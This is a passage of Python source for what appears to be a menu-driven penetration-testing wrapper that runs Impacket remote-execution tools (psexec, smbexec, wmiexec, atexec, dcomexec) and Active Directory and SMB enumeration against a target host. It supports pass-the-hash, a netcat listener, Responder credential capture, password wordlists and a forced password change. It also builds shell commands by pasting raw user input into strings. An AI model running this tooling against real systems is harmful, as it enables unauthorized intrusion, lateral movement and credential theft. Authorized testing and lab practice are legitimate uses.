# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the current USER.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '6':
      BAK = USR
      USR = input("[?] Please enter username: ")
      if USR == "":
         USR = BAK         
      if USR.find("'") != -1:
         print(colored("[!] CAUTION!!! - Password contains a character that may break other parts of this program...", colour0))
      if USR[:2] == "''":
         USR = "''"
      if USR.find("\"") != -1:
         print(colored("[!] WARNING!!! - Password contains an illegal character...", colour0))
         USR = BAK         
      USR = spacePadding(USR, COL1)
      NTM = "EMPTY"      
      for x in range(0, maxUser):
         if USER[x].rstrip(" ") == USR.rstrip(" "):
            NTM = HASH[x]
            if NTM[:1] == " ":
               NTM = "EMPTY"                            
      NTM = spacePadding(NTM, COL1)           
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the current USERS PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '7':
      BAK = PAS
      PAS = input("[?] Please enter password: ")      
      if PAS == "":
         PAS = BAK         
      if PAS.find("'") != -1:
         print(colored("[!] CAUTION!!! - Password contains a character that may break other parts of this program...", colour0))         
      if PAS[:2] == "''":
         PAS = "''"         
      if PAS.find("\"") != -1:
         print(colored("[!] WARNING!!! - Password contains an illegal character...", colour0))
         PAS = BAK         
      PAS = spacePadding(PAS, COL1)
      NTM = spacePadding("EMPTY", COL1)
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the current USERS HASH value
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '8':
      BAK = NTM
      NTM = input("[?] Please enter hash value: ")      
      if NTM != "":
         NTM = spacePadding(NTM, COL1)
      else:
         NTM = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the ticket name
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '9':
      BAK = TGT
      TGT = input("[?] Please enter ticket name: ")      
      if TGT != "":
         TGT = spacePadding(TGT, COL1)
      else:
         TGT = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote DOMAIN name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '10':
      BAK = DOM
      DOM = input("[?] Please enter domain name: ")      
      if DOM == "":
         DOM = BAK
      else:
         DOM = spacePadding(DOM, COL1)         
         if DOMC == 1:
            print("[+] Removing previous domain name " + BAK.rstrip(" ") + " from /etc/hosts...")
            localCOM("sed -i '$d' /etc/hosts")
            DOMC = 0            
         if DOMC == 0:
            if DOM[:5] != "EMPTY":
               localCOM("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
               print("[+] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
               DOMC = 1
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote DOMAIN SID value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '11':
      BAK = SID
      SID = input("[?] Please enter domain SID value: ")
      
      if SID != "":
         SID = spacePadding(SID, COL1)
      else:
         SID = BAK
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote SUB DOMAIN name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '12':
      BAK = EMPTY_1
      EMPTY_1 = input("[?] Please enter sub domain name: ")      
      if EMPTY_1 == "":
         EMPTY_1 = BAK
      else:
         EMPTY_1 = spacePadding(EMPTY_1, COL1)         
         if DOMC2 == 1:
            print("[+] Removing previous domain name " + BAK.rstrip(" ") + " from /etc/hosts...")
            localCOM("sed -i '$d' /etc/hosts")
            DOMC2 = 0            
         if DOMC2 == 0:
            if DOM[:5] != "EMPTY":
               localCOM("echo '" + TIP.rstrip(" ") + "\t" + EMPTY_1.rstrip(" ") + "' >> /etc/hosts")
               print("[+] Domain " + EMPTY_1.rstrip(" ") + " has been added to /etc/hosts...")
               DOMC2 = 1
      prompt()
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the File name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '13':
      BAK = FIL
      FIL = input("[?] Please enter file name: ")      
      if FIL != "":
         FIL = spacePadding(FIL,COL1)
      else:
         FIL = BAK    
 
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote SHARE name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '14':
      BAK = TSH
      TSH = input("[?] Please enter share name: ")      
      if TSH != "":
         TSH = spacePadding(TSH,COL1)
      else:
         TSH = BAK    

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Start HTTP servers
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '15':
      dispSubMenu(" (01) HTTP Server (02) SMB Server (03) PHP Server (04) RUBY Server (05) SMTPD Server (06) NCAT Server (07) Responder (08) Quit")
      checkParam = 0
      subChoice = input("[?] Please select an option: ")
      if subChoice == "1":
         HTTP = input("[?] Please select a port value: ")
         if HTTP.isnumeric():
            choice = "python3 -m http.server --bind " + localIP + " " + HTTP
            checkParam = 1
      if subChoice == "2":
         choice = "impacket-smbserver " + workDir + " ./" + workDir + " -smb2support"
         checkParam = 1
      if subChoice == "3":
         HTTP = input("[?] Please select a port value: ")
         if HTTP.isnumeric():
            choice = "php -S " + localIP + ":" + HTTP    
            checkParam = 1
      if subChoice == "4":
         HTTP = input("[?] Please select a port value: ")
         if HTTP.isnumeric():
            choice = "ruby -run -e httpd . -p " + HTTP
            checkParam = 1
      if subChoice == "5":
         HTTP = input("[?] Please select a port value: ")
         if HTTP.isnumeric():
            choice = "python3  /usr/lib/python3.9/smtpd.py -n -c DebuggingServer " + localIP + ":" + HTTP
            checkParam = 1
      if subChoice == "6":
         HTTP = input("[?] Please select a port value: ")
         choice = "rlwrap nc -nvlp " + HTTP
         checkParam = 1
      if subChoice == "7":
         choice = "responder -I " + netWork + " -w On -r ONn -f On -v"
         checkParam = 1
      if subChoice == "8":
         pass
      if checkParam != 0:
        if HTTP != "":
            print(colored("[*] Specified local service started...", colour3))
            localCOM("xdotool key Ctrl+Shift+T")
            localCOM("xdotool key Alt+Shift+S; xdotool type 'LOCAL SERVICE'; xdotool key Return")
            dispBanner("LOCAL SERVICE",0) 
            localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
            localCOM("xdotool type '" + choice + "'; xdotool key Return")
            localCOM("xdotool key Ctrl+Tab")         
      prompt()    
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - communityString
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '28':   
      print("[+] Alternative community strings...\n")
      print("\tpublic") 
      print("\tprivate")
      print("\tmanager")
      print("\tinternal\n")        
      BAK = communityString
      communityString = input("[?] Please enter a new community string: ")      
      if communityString == "":
         communityString = BAK
      else:
         print("[+] Community string changed...")
      if len(communityString) < COL1:
         communityString = spacePadding(communityString, COL1)
      prompt() 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - fuzzRider
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '29':   
      BAK = FuzzRider
      FuzzRider = input("[?] Please enter a new fuzz rider command: ")      
      if FuzzRider == "":
         FuzzRider = BAK
      else:
         print("[+] FuzzRider changed...")
      if len(FuzzRider) < COL1:
         FuzzRider = spacePadding(FuzzRider, COL1)
      prompt()      

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected -
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '30':   
      print("[+] Alternative word lists...\n")
      print("\t/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt") 
      print("\t/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt")
      print("\t/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt")
      print("\t/usr/share/seclists/Discovery/Web-Content/common.txt")   
      print("\t./ROGUEAGENT/passwords.txt")      
      print("\t./TREADSTONE/apache.txt\n")
      BAK = currentWordlist
      currentWordlist = input("[?] Please enter a new word list: ")      
      if currentWordlist == "":
         curentWordlist = BAK
      else:
         print("[+]  Wordlist succesfully changed...")
      if len(currentWordlist) < COL1:
         currentWordlist = spacePadding(currentWordlist, COL1)
         
         
      #CHECK EXSITS AT SOME STAGE!
      prompt()      
                  
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - getArch.py target IP
# Details : 32/64 bit
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '31':
      checkParam = test_TIP()      
      if checkParam != 1:
         print(colored("[*] Attempting to enumerate architecture...", colour3))
         remoteCOM(keyPath + "getArch.py -target " + TIP.rstrip(" ") + " > os.tmp")                 
         with open("os.tmp") as read:
            for arch in read:
               if "is" in arch:
                  print("[+] Found architecture...\n")
                  print(colored(arch.rstrip("\n"),colour6))
                  checkParam = 1                  
      if checkParam == 0:
         print("[+] Unable to identify architecture...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - netview.py DOMAIM/USER:PASSWORD -target IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='32':
      checkParama = test_TIP()
      if checkParam != 1:
         checkParam = test_DOM()      
      if checkParam != 1:
         remoteCOM(keyPath + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -target " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - services.py USER:PASSWOrd@IP list.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='33':
      checkParam = test_TIP
      if checkParam != 1:
         checkParam = test_DOM()      
      if checkParam != 1:
         remoteCOM(keyPath + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " list")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - atexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '34':
      checkParam = test_TIP()
      if checkParam != 1:
         checkParam = test_DOM()      
      if checkParam != 1:
         remoteCOM(keyPath + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " whoami /all")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - dcomexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '35':
      checkParam = test_TIP()
      if checkParam != 1:
         checkParam = test_DOM()               
      if checkParam != 1:
         remoteCOM(keyPath + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " '" + WEB.rstrip(" ") + "'")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - psexec.py DOMAIN/USER:PASSWORD@IP service command.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '36':
      checkParam = test_TIP()
      if checkParam != 1:
         checkParam = test_DOM()               
      if checkParam != 1:
         remoteCOM(keyPath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " -service-name LUALL.exe")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbexec.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '37':
      checkParam = test_TIP()
      if checkParam != 1:
         checkParam = test_DOM()            
      if checkParam != 1:
         remoteCOM(keyPath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - wmiexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '38':
      checkParam = test_TIP()
      if checkParam != 1:
         checkParam = test_DOM()      
      if checkParam != 1:
         remoteCOM(keyPath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - showmount -e IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='39':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_PRT("2049")
         if checkParam != 1:
            remoteCOM("showmount -e " + TIP.rstrip(" ") + " > mount.tmp")
            localCOM("sed -i '/Export list for/d' mount.tmp")                  
            if os.path.getsize("mount.tmp") > 0:
               print("[+] NFS exports found...\n")            
               with open("mount.tmp") as read:
                  for mount in read:
                     mount = mount.replace("/","")
                     mount = mount.rstrip("\n")
                     print(colored(mount,colour6))
            else:
               print("[-] No NFS exports were found...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - mount -t nfs  IP:/mount mount/
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '40':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_PRT("2049")
         if checkParam != 1:
            mount = input("[?] Please enter NFS name : ")         
            if not os.path.exists(mount):
               localCOM("mkdir " + mount)
            remoteCOM("mount -o nolock -t nfs " + TIP.rstrip(" ") + ":/" + mount + " " + mount + "/")
            print("[+] NFS " + mount + " mounted...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -U-GUC --da --full.
# Modified: 08/12/2020 - Currently Using DOM rather than TIP as command has issues with IP6.
# -------------------------------------------------------------------------------------

   if selection =='41':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()                  
      if checkParam != 1:
            print(colored("[*] Enumerating DNS zones...", colour3))
            remoteCOM(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -l " + DOM.rstrip(" ") + " --full")
            print(colored("\n[*] Enumerating domain admins...", colour3))
            remoteCOM(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --da --full")                  
            print(colored("\n[*] Enumerating admin protected objects...", colour3))
            remoteCOM(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --admin-objects --full")                           
            print(colored("\n[*] Enumerating domain users...", colour3))
            remoteCOM(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U --full")         
            print(colored("\n[*] Enumerating remote management users...",colour3))
            remoteCOM(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U -m 'Remote Management Users' --full")                  
            print(colored("\n[*] Enumerating users with unconstrained delegation...", colour3))
            remoteCOM(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --unconstrained-users --full")
            print(colored("\n[*] Enumerating domain groups...", colour3))
            remoteCOM(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -G --full")        
            print(colored("\n[*] Enumerating AD computers...", colour3))
            remoteCOM(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -C --full")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - lookupsid.py DOMAIN/USR:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='42':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()               
      if checkParam != 1:
         print(colored("[*] Enumerating, please wait....", colour3))
         remoteCOM(keyPath + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " > domain.tmp")                  
         localCOM("cat domain.tmp | grep 'Domain SID' > sid.tmp")         
         with open("sid.tmp", "r") as read:
            line1 =  read.readline()            
         if "Domain SID is:" in line1:
            SID = line1.replace('[*] Domain SID is: ',"")
            print("[+] Found DOMAIN SID...\n")
            print(colored(" " + SID, colour6))
            SID = spacePadding(SID, COL1)               
         else:
            print("[+] Unable to find domain SID...")                         
         localCOM("sed -i /*/d domain.tmp")
         localCOM("sed -i 's/.*://g' domain.tmp")   
         localCOM("cat domain.tmp | grep SidTypeAlias | sort > alias.tmp")      
         localCOM("cat domain.tmp | grep SidTypeGroup | sort > group.tmp")
         localCOM("cat domain.tmp | grep SidTypeUser  | sort > users.tmp")         
         localCOM("sed -i 's/(SidTypeAlias)//g' alias.tmp")
         localCOM("sed -i 's/(SidTypeGroup)//g' group.tmp")
         localCOM("sed -i 's/(SidTypeUser)//g'  users.tmp")                           
         if os.path.getsize("alias.tmp") != 0:
            print("[+] Found Aliases...\n")
            catsFile("alias.tmp")
         else:
            print("[+] Unable to find aliases...")                                    
         if os.path.getsize("group.tmp") != 0:
            print("\n[+] Found Groups...\n")
            catsFile("group.tmp")
         else:
            print("[+] Unable to find groups...")                                  
         if os.path.getsize("users.tmp") != 0:
            print("\n[+] Found Users...\n")
            catsFile("users.tmp")
         else:
            print("[+] Unable to find usernames...")                              
         if os.path.getsize("users.tmp") != 0:
            localCOM("rm " + dataDir + "/usernames.txt")
            localCOM("rm " + dataDir + "/hashes.txt")
            localCOM("touch " + dataDir + "/hashes.txt")
            wipeTokens(VALD)                     
            with open("users.tmp", "r") as read:
               for x in range(0, maxUser):
                  HASH[x] = " "*COL4
                  line1 = read.readline()                  
                  if line1 != "":
                     try:
                        null,USER[x] = line1.split("\\")
                     except ValueError:
                        USER[x] = "Error..."
                     USER[x] = spacePadding(USER[x], COL3)
                     localCOM("echo " + USER[x] + " >> " + dataDir + "/usernames.txt")
                  else:
                     USER[x] = " "*COL3
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='43':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()               
      if checkParam != 1:
         print(colored("[*] Enumerating users, please wait this can take sometime...", colour3))         
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password authentication...\n")
            remoteCOM(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " > users.tmp")
         else:
            remoteCOM(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " > users.tmp")         
         count = lineCount("users.tmp")         
         if count > 0:
            with open("users.tmp", "r") as read:
               for x in range(0, count):
                  line = read.readline()
                  if ("[-] SMB SessionError:" in line) or ("[-] SAMR SessionError:" in line):
                     checkParam = 1
                     localCOM("cat users.tmp")
                     break                                 
         if checkParam != 1:
            localCOM("rm " + dataDir + "/usernames.txt")          
            localCOM("rm " + dataDir + "/hashes.txt")                        
            localCOM("touch " + dataDir + "/hashes.txt")                      
            localCOM("sed -i -n '/Found user: /p' users.tmp")
            localCOM("cat users.tmp | sort > users2.tmp")            
            wipeTokens(VALD)            
            print("[+] Found usernames...\n")            
            with open("users2.tmp", "r") as read:
               for x in range (0, maxUser):
                  USER[x] = read.readline()                  
                  if USER[x] != "":
                     USER[x] = USER[x].replace("Found user: ", "")
                     USER[x] = USER[x].split(",")
                     USER[x] = USER[x][0]
                     USER[x] = spacePadding(USER[x], COL3)                                          
                     if USER[x] != "":
                       print(colored(USER[x],colour6))
                       localCOM("echo " + USER[x] + " >> " + dataDir + "/usernames.txt")
                       HASH[x] = " "*COL4
                     else:
                        USER[x] = " "*COL3
                        HASH[x] = " "*COL4
                  else:
                     USER[x] = " "*COL3
                     HASH[x] = " "*COL4
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
# Modified: N/A
# Note    : Needs a structure rewrite!!!
# -------------------------------------------------------------------------------------

   if selection =='44':
      checkParam = test_TIP()     
      if checkParam != 1:
         checkParam = test_DOM()                  
      if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password authentication...")           
      print("[i] Valid registry hives are shown below...\n")
      registryKeys()                            
      if checkParam != 1:
         registryKey = ""         
         while registryKey.lower() != "quit":
            registryKey = input("\n[*] Enter registry key or type 'quit' to finish or 'help' for help: ") 
            if registryKey.lower() == "help":
               registryKeys()
            else:
               if NTM[:5] != "EMPTY" and registryKey.lower() != "quit": 
                  remoteCOM(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " query -keyName '" + registryKey + "' -s")
               else:
                  if registryKey.lower() != "quit":
                     remoteCOM(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " query -keyName '" + registryKey + "' -s")
      prompt()
            
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ./rpcdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='45':
      checkParam = test_TIP()
      if checkParam != 1:
         checkParam = test_DOM()      
      if checkParam != 1:
         remoteCOM(keyPath + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))

      stringBindings = input("[?] Enter a valid stringbinding value, such as 'ncacn_ip_tcp:" + DOM.rstrip(" ") + "[135]' : ")            
      if checkParam != 1:
         if NTM[:5] != "EMPTY":
            print("[!] Using HASH value as defualt password...")
            if "135" in PTS:
               remoteCOM(keyPath + "rpcmap.py -debug -auth-transport debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + stringBindings)
            if "443" in PTS:
               remoteCOM(keyPath + "rpcmap.py -debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + " -auth-rpc " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + " -auth-level 6 -brute-opnums " + stringBindings)
         else:
            if "135" in PTS:
               remoteCOM(keyPath + "rpcmap.py -debug -auth-transport debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " " + stringBindings)
            if "443" in PTS:
               remoteCOM(keyPath + "rpcmap.py -debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -auth-rpc " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -auth-level 6 -brute-opnums " + stringBindings)
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - rpcclient -U USER%PASSWORD IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '46':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()                     
      if checkParam != 1:
         if NTM[:5] == "EMPTY":
            remoteCOM("rpcclient -U " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" "))
         else:
            print("[i] Using HASH value as password login credential...\n")
            remoteCOM("rpcclient -U " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ")) 
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbclient -L \\\\IP -U USER%PASSWORD
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='47':
      checkParams = test_TIP()      
      if checkParams != 1:
         print(colored("[*] Finding shares, please wait...", colour3))         
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            remoteCOM("smbmap -H " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + "%:" + NTM.rstrip(" ") + " > shares1.tmp")
         else:
            if PAS.rstrip(" ") == "''":
               remoteCOM("smbmap -H " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares1.tmp") # No --no-pass setting
            else:   
               remoteCOM("smbmap -H " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares1.tmp")
         catsFile("shares1.tmp")             
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")            
            remoteCOM("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " --pw-nt-hash " + NTM.rstrip(" ") + " > shares2.tmp")
         else:
            if PAS.rstrip(" ") == "''":
               remoteCOM("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " --password=" + PAS.rstrip(" ") + " -no-pass > shares2.tmp")
            else:
               remoteCOM("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " --password=" + PAS.rstrip(" ") + " > shares2.tmp")                           
         cutLine("Enter WORKGROUP", "shares2.tmp")
         cutLine("Password for [WORKGROUP\]", "shares2.tmp")    
         catsFile("shares2.tmp")         
         bonusCheck = linecache.getline("shares2.tmp", 1)
         if "session setup failed: NT_STATUS_PASSWORD_MUS" in bonusCheck:
            print(colored("[!] Bonus!! It looks like we can change this users password...", colour0))
            remoteCOM("smbpasswd -r " + TIP.rstrip(" ") + " -U " + USR.rstrip(" "))                                            
         if os.path.getsize("shares2.tmp") != 0: 
            cutLine("is an IPv6 address","shares2.tmp")
            cutLine("no workgroup","shares2.tmp")
            cutLine("NT_STATUS_LOGON_FAILURE","shares2.tmp")
            cutLine("NT_STATUS_ACCESS_DENIED","shares2.tmp")
